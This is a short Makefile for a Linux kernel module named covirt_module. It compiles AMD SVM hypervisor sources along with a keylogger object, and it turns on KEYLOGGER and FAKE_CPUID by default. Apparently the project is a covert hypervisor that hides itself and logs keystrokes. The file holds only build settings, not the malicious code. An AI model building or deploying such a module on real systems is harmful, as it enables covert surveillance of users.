obj-m += covirt_module.o
covirt_module-objs += src/covirt_module.o src/reg_utils.o src/svm_utils.o src/vmcb.o src/low_level.o src/apic.o src/exit_handle.o src/io.o src/keylogger.o
EXTRA_CFLAGS=-I$(PWD)/include

DEBUG_ENABLED = 0
KEYLOGGER = 1
FAKE_CPUID = 1

ifeq ($(DEBUG_ENABLED), 1)
	EXTRA_CFLAGS += -DDEBUG_ENABLED
endif

ifeq ($(KEYLOGGER), 1)
	EXTRA_CFLAGS += -DKEYLOGGER
endif

ifeq ($(FAKE_CPUID), 1)
	EXTRA_CFLAGS += -DFAKE_CPUID
endif

ifndef KERNEL_ROOT
	KERNEL_ROOT=../testing_playground/obj/linux-basic/
endif

all:
	make -C $(KERNEL_ROOT) M=$(PWD) modules
	
clean:
	make -C $(KERNEL_ROOT) M=$(PWD) clean
